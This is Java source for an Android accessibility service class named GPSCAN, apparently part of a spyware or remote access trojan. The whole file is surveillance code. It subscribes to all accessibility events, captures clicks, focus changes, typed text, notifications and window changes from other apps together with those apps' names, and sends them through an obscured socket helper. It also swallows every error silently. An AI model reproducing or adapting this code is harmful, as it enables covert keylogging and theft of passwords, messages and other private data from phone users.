package store.apps;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;

public class GPSCAN extends AccessibilityService {


    private String getEventText(AccessibilityEvent event) {
        List<CharSequence> text = event.getText();
        return text.toString();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if(EngineWorkerins._the_sokt_){
                final int eventType = event.getEventType();
                switch(eventType) {
                    case AccessibilityEvent.TYPE_VIEW_CLICKED:


                        try
                        {
                            s(event,0);
                        }catch (Exception SS){




                             }
                        break;
                    case AccessibilityEvent.TYPE_VIEW_FOCUSED:

                        try
                        {
                            s(event,1);
                        }catch (Exception SS){




                             }
                        break;
                    case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:

                        try
                        {
                            s(event,2);
                        }catch (Exception SS){




                             }
                        break;
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                        s(event,3);
                        break;
                    case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED  :
                        s(event,4);
                        break;
                    case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  :
                        s(event,5);
                        break;
                }
            }
        } catch (Exception e) {}
    }
    public void s(AccessibilityEvent event , int f){
       try
       {
           String s = getEventText(event);
           String p = (String) event.getPackageName();
           PackageManager pk = getApplicationContext().getPackageManager();
           ApplicationInfo fo ;
           try {
               fo = pk.getApplicationInfo(p, 0);
           } catch (final PackageManager.NameNotFoundException e) {






               fo = null;
           }
           String n = (String) (fo != null ? pk.getApplicationLabel(fo ) : EngineWorkerins._the_plugns_[3]);
           ConHelpOne._send_mthd_(EngineWorkerins._the_plugns_[1] + EngineWorkerins._the_plugns_[2] + n + EngineWorkerins._the_plugns_[2] + s + EngineWorkerins._the_plugns_[2] + String.valueOf(f),"\t".getBytes());
       }catch (Exception bs){}
    }
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            AccessibilityServiceInfo f = new AccessibilityServiceInfo();
            f.flags = AccessibilityServiceInfo.DEFAULT |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS ;

            f.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            f.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            setServiceInfo(f);
        } catch (Exception e) {}
    }
    @Override
    public void onInterrupt() {}
}

